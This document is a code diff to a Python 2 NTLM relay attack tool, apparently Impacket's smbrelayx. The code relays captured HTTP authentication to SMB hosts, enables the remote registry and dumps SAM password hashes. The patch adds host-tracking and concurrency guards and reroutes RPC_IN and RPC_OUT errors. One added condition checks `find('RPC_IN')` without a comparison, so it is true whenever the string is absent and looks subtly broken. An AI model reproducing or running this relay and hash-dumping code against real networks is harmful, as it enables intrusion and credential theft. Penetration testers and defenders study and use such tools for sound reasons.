@@ -119,6 +119,8 @@ class doAttack(Thread):
                 remoteOps  = RemoteOperations(self.__SMBConnection, False)
                 remoteOps.enableRegistry()
             except Exception, e:
+                #import traceback
+                #traceback.print_exc()
                 # Something wen't wrong, most probably we don't have access as admin. aborting
                 logging.error(str(e))
                 ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
@@ -149,6 +151,8 @@ class doAttack(Thread):
                     samHashes.dump()
                     logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
             except Exception, e:
+                #import traceback
+                #traceback.print_exc()
                 ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
                 logging.error(str(e))
             finally:
@@ -156,6 +160,11 @@ class doAttack(Thread):
                     samHashes.finish()
                 if remoteOps is not None:
                     remoteOps.finish()
+            try:
+                ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
+            except Exception, e:
+                logging.error(str(e))
+                pass
 
 
 class SMBClient(SMB):
@@ -494,6 +503,11 @@ class HTTPRelayServer(Thread):
             self.send_header('Content-Length','0')
             self.end_headers()
 
+        def send_error(self, code, message=None):
+            if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
+                return self.do_GET()
+            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_error(self,code,message)
+
         def do_GET(self):
             messageType = 0
             if self.headers.getheader('Authorization') is None:
@@ -515,6 +529,12 @@ class HTTPRelayServer(Thread):
                 else:
                     self.target = self.server.target
                 try:
+                    if self.client is not None:
+                        logging.error('Still performing an attack against %s' % self.client.get_remote_host())
+                        self.send_response(404)
+                        self.end_headers()
+                        return
+
                     self.client = SMBClient(self.target, extended_security = True)
                     self.client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
                     self.client.set_timeout(60)
@@ -561,9 +581,13 @@ class HTTPRelayServer(Thread):
                     # Target will be attacked, adding to the attacked set
                     # If the attack fails, the doAttack thread will be responsible of removing it from the set
                     global ATTACKED_HOSTS
-                    ATTACKED_HOSTS.add(self.target)
-                    clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
-                    clientThread.start()
+                    if self.target not in ATTACKED_HOSTS:
+                        ATTACKED_HOSTS.add(self.target)
+                        clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
+                        self.client = None
+                        clientThread.start()
+                    else:
+                        logging.error('%s is being attacker at the moment, skipping.. ' % self.target)
 
                     # And answer 404 not found
                     self.send_response(404)
